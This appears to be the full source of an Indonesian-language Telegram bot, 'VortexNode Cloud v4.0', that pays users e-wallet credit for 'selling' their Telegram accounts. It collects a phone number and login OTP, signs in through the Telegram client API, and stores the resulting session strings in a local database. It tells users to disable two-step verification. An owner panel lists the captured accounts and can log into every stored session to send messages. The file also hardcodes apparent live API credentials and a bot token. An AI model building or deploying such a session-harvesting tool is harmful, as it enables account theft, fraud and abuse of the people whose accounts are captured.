const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8238521944:AAGtfc6goWfX0bmm1cmKuYlD-p3lIGjJvCM';
const logChannel = '-1003121256961';
const ownerId = 8457401920; 
const DB_FILE = './database.json';
const MIN_WD = 50000;

const bot = new Telegraf(botToken);
const userSessions = {}; 

// --- DATABASE ENGINE ---
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ 
        accounts: [], 
        users: {}, 
        settings: { harga_biasa: 20000, harga_plus: 25000 } 
    }, null, 2));
}

const getData = () => JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

// --- UTILS: ANIMASI ---
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const drawLoading = async (ctx, messageId, title) => {
    const bars = [
        "█▒▒▒▒▒▒▒▒▒ 10%", "██▒▒▒▒▒▒▒▒ 20%", "███▒▒▒▒▒▒▒ 30%", "████▒▒▒▒▒▒ 40%",
        "█████▒▒▒▒▒ 50%", "██████▒▒▒▒ 60%", "███████▒▒▒ 70%", "████████▒▒ 80%",
        "█████████▒ 90%", "██████████ 100%"
    ];
    for (const bar of bars) {
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, null, 
                `<blockquote>⏳ ${title}\n\n${bar}</blockquote>`, { parse_mode: 'HTML' });
            await sleep(300);
        } catch (e) {}
    }
};

// --- TEMPLATE PESAN ---
const startText = (name) => 
    `<blockquote>✨ <b>SELAMAT DATANG, ${name.toUpperCase()}!</b> ✨\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚀 <b>VORTEXNODE CLOUD v4.0</b>\n` +
    `Platform konversi akun Telegram menjadi Saldo E-Wallet secara instan dan aman.\n\n` +
    `💎 <b>KEUNTUNGAN:</b>\n` +
    `• 🟢 <b>Otomatis:</b> Saldo cair instan setelah login.\n` +
    `• 🟢 <b>Harga:</b> Bersaing & Mengikuti harga pasar.\n` +
    `• 🟢 <b>Keamanan:</b> Sesi aman dalam database terenkripsi.\n\n` +
    `⚠️ <b>SYARAT & KETENTUAN (S&K):</b>\n` +
    `1. Wajib mematikan Verifikasi 2 Langkah (2FA).\n` +
    `2. Akun tidak boleh dalam keadaan limit/spam.\n` +
    `3. Dilarang keras menjual akun hasil ilegal.\n` +
    `4. Penjualan bersifat permanen & tidak bisa ditarik.</blockquote>`;

const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN (INSTANT)', 'jual_akun')],
    [Markup.button.callback('👤 PROFIL', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

const backBtn = (target) => Markup.inlineKeyboard([[Markup.button.callback('🔙 KEMBALI', target)]]);

// --- START ---
bot.start((ctx) => ctx.replyWithHTML(startText(ctx.from.first_name), mainBtn()));

bot.action('main_menu', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.editMessageText(startText(ctx.from.first_name), { parse_mode: 'HTML', ...mainBtn() });
});

// --- LOGIKA JUAL AKUN ---
bot.action('jual_akun', async (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.editMessageText(
        '<blockquote>📲 <b>MASUKKAN NOMOR TELEGRAM</b>\n\nSilahkan kirim nomor Anda dengan kode negara.\nContoh: <code>628123456789</code></blockquote>',
        { parse_mode: 'HTML', ...backBtn('main_menu') }
    );
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    const db = getData();

    if (!state) return;

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        const phone = text.replace(/[^0-9]/g, '');
        if (db.accounts.find(a => a.phone === phone)) {
            return ctx.replyWithHTML('<blockquote>❌ <b>NOMOR SUDAH ADA!</b>\nNomor ini sudah pernah terjual sebelumnya.</blockquote>', mainBtn());
        }

        const msg = await ctx.replyWithHTML('<blockquote>📡 <b>MENGHUBUNGI SERVER...</b></blockquote>');
        await drawLoading(ctx, msg.message_id, "Mengirim Permintaan OTP");

        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
            
            state.client = client;
            state.phone = phone;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            ctx.replyWithHTML('<blockquote>📩 <b>OTP TERKIRIM!</b>\n\nMasukkan kode dengan spasi.\nContoh: <code>1 2 3 4 5</code></blockquote>');
        } catch (err) {
            ctx.replyWithHTML(`<blockquote>❌ <b>ERROR:</b> ${err.message}</blockquote>`, mainBtn());
            delete userSessions[userId];
        }
    }

    // STEP 2: OTP
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        const msg = await ctx.replyWithHTML('<blockquote>🔐 <b>MENVERIFIKASI...</b></blockquote>');
        await drawLoading(ctx, msg.message_id, "Sinkronisasi Sesi");

        try {
            const client = state.client;
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            const harga = state.phone.startsWith('1') ? db.settings.harga_plus : db.settings.harga_biasa;

            db.accounts.push({
                phone: state.phone, session: sessionStr,
                sellerId: userId, sellerName: ctx.from.first_name, date: new Date().toLocaleString()
            });

            if (!db.users[userId]) db.users[userId] = { balance: 0 };
            db.users[userId].balance += harga;
            saveData(db);
            
            ctx.replyWithHTML(
                `<blockquote>✅ <b>PENJUALAN BERHASIL!</b>\n━━━━━━━━━━━━━━━━\n📱 No: <code>${state.phone}</code>\n💰 Bonus: +Rp ${harga.toLocaleString()}\n💳 Total: Rp ${db.users[userId].balance.toLocaleString()}</blockquote>`,
                mainBtn()
            );

            bot.telegram.sendMessage(logChannel, `✅ <b>AKUN MASUK</b>\nUser: ${ctx.from.first_name}\nNo: ${state.phone}\nHarga: Rp ${harga.toLocaleString()}`, { parse_mode: 'HTML' });
            await client.disconnect();
        } catch (err) {
            ctx.replyWithHTML(`<blockquote>❌ <b>GAGAL:</b> ${err.message}\nPastikan 2FA Mati!</blockquote>`, mainBtn());
        }
        delete userSessions[userId];
    }

    // SET HARGA BIASA
    else if (state.step === 'set_harga_biasa' && userId === ownerId) {
        db.settings.harga_biasa = parseInt(text);
        saveData(db);
        ctx.replyWithHTML(`<blockquote>✅ Harga Biasa diatur ke: <b>Rp ${db.settings.harga_biasa.toLocaleString()}</b></blockquote>`, backBtn('owner_menu'));
        delete userSessions[userId];
    }

    // SET HARGA PLUS (No. Awalan 1)
    else if (state.step === 'set_harga_plus' && userId === ownerId) {
        db.settings.harga_plus = parseInt(text);
        saveData(db);
        ctx.replyWithHTML(`<blockquote>✅ Harga Plus diatur ke: <b>Rp ${db.settings.harga_plus.toLocaleString()}</b></blockquote>`, backBtn('owner_menu'));
        delete userSessions[userId];
    }

    // BROADCAST
    else if (state.step === 'input_bc' && userId === ownerId) {
        ctx.replyWithHTML('<blockquote>📢 <b>PROSES BROADCAST...</b></blockquote>');
        let c = 0;
        for (const acc of db.accounts) {
            try {
                const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
                await client.connect();
                await client.sendMessage('me', { message: text });
                c++; await client.disconnect();
            } catch (e) {}
        }
        ctx.replyWithHTML(`<blockquote>✅ Terkirim ke ${c} akun!</blockquote>`, backBtn('owner_menu'));
        delete userSessions[userId];
    }
});

// --- PROFILE & WD ---
bot.action('profile', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    ctx.editMessageText(
        `<blockquote>👤 <b>PROFIL SAYA</b>\n\n• Nama: ${ctx.from.first_name}\n• Saldo: <b>Rp ${bal.toLocaleString()}</b>\n• Status: Member Aktif</blockquote>`,
        { parse_mode: 'HTML', ...backBtn('main_menu') }
    );
});

bot.action('withdraw', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    if (bal < MIN_WD) return ctx.answerCbQuery(`Saldo minimun Rp ${MIN_WD.toLocaleString()}`, { show_alert: true });
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.editMessageText(`<blockquote>💸 <b>WD MENU</b>\nSaldo: Rp ${bal.toLocaleString()}\nFormat: <code>EWALLET - NOMOR - JUMLAH</code></blockquote>`, { parse_mode: 'HTML', ...backBtn('main_menu') });
});

// --- OWNER MENU ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    const db = getData();
    ctx.editMessageText(
        `<blockquote>👑 <b>OWNER PANEL</b>\n\n💰 Harga Biasa: Rp ${db.settings.harga_biasa.toLocaleString()}\n💎 Harga Plus (1): Rp ${db.settings.harga_plus.toLocaleString()}</blockquote>`,
        { parse_mode: 'HTML', 
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📑 DAFTAR NOMOR', 'list_0')],
            [Markup.button.callback('💰 SET HARGA BIASA', 'set_biasa'), Markup.button.callback('💎 SET HARGA PLUS', 'set_plus')],
            [Markup.button.callback('📢 BROADCAST', 'bc_menu')],
            [Markup.button.callback('🔙 KEMBALI', 'main_menu')]
          ])
        }
    );
});

bot.action('set_biasa', (ctx) => {
    userSessions[ctx.from.id] = { step: 'set_harga_biasa' };
    ctx.replyWithHTML('<blockquote>💰 <b>SET HARGA BIASA</b>\nMasukkan angka saja (Contoh: 20000):</blockquote>');
});

bot.action('set_plus', (ctx) => {
    userSessions[ctx.from.id] = { step: 'set_harga_plus' };
    ctx.replyWithHTML('<blockquote>💎 <b>SET HARGA PLUS (AWALAN 1)</b>\nMasukkan angka saja (Contoh: 25000):</blockquote>');
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const db = getData();
    const current = db.accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
    if ((page * 5) + 5 < db.accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    ctx.editMessageText(`<blockquote>📑 <b>LIST AKUN (Hal ${page+1})</b></blockquote>`, { parse_mode: 'HTML', ...Markup.inlineKeyboard(buttons) });
});

bot.action('bc_menu', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_bc' };
    ctx.replyWithHTML('<blockquote>📢 <b>BROADCAST</b>\nKetik pesan teks yang ingin dikirim:</blockquote>');
});

bot.launch();
console.log('🚀 Vortex Cloud v4.0 is Running!');
